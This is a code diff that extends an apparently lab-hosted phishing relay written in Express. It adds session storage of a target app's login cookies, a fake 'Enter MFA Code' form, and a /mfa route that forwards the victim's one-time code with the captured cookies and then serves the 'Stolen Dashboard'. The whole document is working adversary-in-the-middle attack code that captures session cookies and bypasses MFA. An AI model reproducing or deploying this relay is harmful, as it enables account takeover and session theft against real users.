@@ -2,8 +2,16 @@ const express = require('express');
 const axios = require('axios');
 
 const app = express();
+const session = require('express-session');
 
 app.use(express.urlencoded({ extended: true }));
+app.use(
+  session({
+    secret: 'attacker-secret',
+    resave: false,
+    saveUninitialized: true,
+  })
+);
 
 app.get('/', (req, res) => {
 
@@ -63,6 +71,8 @@ app.post('/login', async (req, res) => {
     
     const cookies =
       response.headers['set-cookie'];
+    req.session.realAppCookies =
+      cookies;
     
     console.log(cookies);
 
@@ -81,11 +91,20 @@ app.post('/login', async (req, res) => {
     console.log(meResponse.status);
     
     res.send(`
-      <h1>Relay Result</h1>
+      <h1>Enter MFA Code</h1>
     
-      <pre>
-    ${response.status}
-      </pre>
+      <form method="POST" action="/mfa">
+    
+        <input
+          name="token"
+          placeholder="123456"
+        />
+    
+        <button type="submit">
+          Verify
+        </button>
+    
+      </form>
     `);
 
   } catch (err) {
@@ -93,6 +112,64 @@ app.post('/login', async (req, res) => {
     console.error(err);
 
     res.send('Relay failed');
+  }
+});
+
+app.post('/mfa', async (req, res) => {
+
+  const { token } = req.body;
+
+  const cookies =
+    req.session.realAppCookies;
+
+  try {
+
+    const response =
+      await axios.post(
+        'http://app:3000/mfa/verify',
+        new URLSearchParams({
+          token,
+        }),
+        {
+          headers: {
+            Cookie: cookies.join(';'),
+            'Content-Type':
+              'application/x-www-form-urlencoded',
+          },
+          maxRedirects: 0,
+          validateStatus: () => true,
+        }
+      );
+
+    console.log(response.status);
+
+    const dashboardResponse =
+      await axios.get(
+        'http://app:3000/dashboard',
+        {
+          headers: {
+            Cookie: cookies.join(';'),
+          },
+          maxRedirects: 0,
+          validateStatus: () => true,
+        }
+      );
+    
+    console.log(
+      dashboardResponse.status
+    );
+    
+    res.send(`
+      <h1>Stolen Dashboard</h1>
+    
+      ${dashboardResponse.data}
+    `);
+
+  } catch (err) {
+
+    console.error(err);
+
+    res.send('MFA relay failed');
   }
 });
 
